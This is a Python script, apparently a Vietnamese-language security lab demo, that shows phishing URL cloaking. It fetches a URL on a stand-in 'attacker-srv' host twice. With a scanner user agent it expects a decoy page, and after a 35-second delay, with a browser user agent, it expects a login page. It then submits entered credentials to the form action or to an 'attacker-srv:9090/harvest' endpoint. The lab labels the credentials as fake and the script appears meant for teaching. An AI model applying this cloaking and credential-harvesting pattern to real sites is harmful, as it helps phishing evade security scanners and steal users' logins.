#!/usr/bin/env python3
import re
import time
import urllib.parse
import urllib.request

TARGET = "http://attacker-srv:8080/verify?ref=promo2024"
DELAY = 35

BOT_UA = "Mozilla/5.0 (compatible; SandboxScanner/1.0; +https://security-vendor.test)"
USR_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

def get(url, ua):
    req = urllib.request.Request(url, headers={"User-Agent": ua})
    with urllib.request.urlopen(req, timeout=8) as resp:
        return resp.read().decode("utf-8", errors="replace")

def is_decoy(html):
    s = html.lower()
    return "404" in html or "khong ton tai" in s or "het han" in s

def is_login(html):
    return 'name="username"' in html or 'type="password"' in html

def get_form_action(html):
    m = re.search(r'action=["\']([^"\']+)["\']', html, re.I)
    return m.group(1) if m else "http://attacker-srv:9090/harvest"

def main():
    print("=== URL Cloaking Advanced Demo ===")

    print("\n[1] Scanner truy cap URL...")
    html1 = get(TARGET, BOT_UA)
    if is_decoy(html1):
        print("[RESULT BOT] DECOY")
    else:
        print("[RESULT BOT] Noi dung khong mong doi")

    print(f"\n[2] Cho {DELAY}s de mo phong delayed activation...")
    time.sleep(DELAY)

    print("\n[3] Victim demo truy cap URL...")
    html2 = get(TARGET, USR_UA)
    if not is_login(html2):
        print("[RESULT VICTIM] Khong nhan duoc trang login demo.")
        return

    print("[RESULT VICTIM] LOGIN")
    print("Chi nhap tai khoan/mat khau GIA danh cho bai lab.")
    username = input("Ten dang nhap gia: ")
    password = input("Mat khau gia: ")

    action = get_form_action(html2)
    payload = urllib.parse.urlencode({
        "username": username,
        "password": password,
    }).encode("utf-8")

    req = urllib.request.Request(
        action,
        data=payload,
        headers={
            "User-Agent": USR_UA,
            "Content-Type": "application/x-www-form-urlencoded",
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        print("[SUBMIT]", resp.read().decode("utf-8", errors="replace"))

    print("\n[LAB] Chuyen sang attacker-srv de xem su kien mo phong.")

if __name__ == "__main__":
    main()
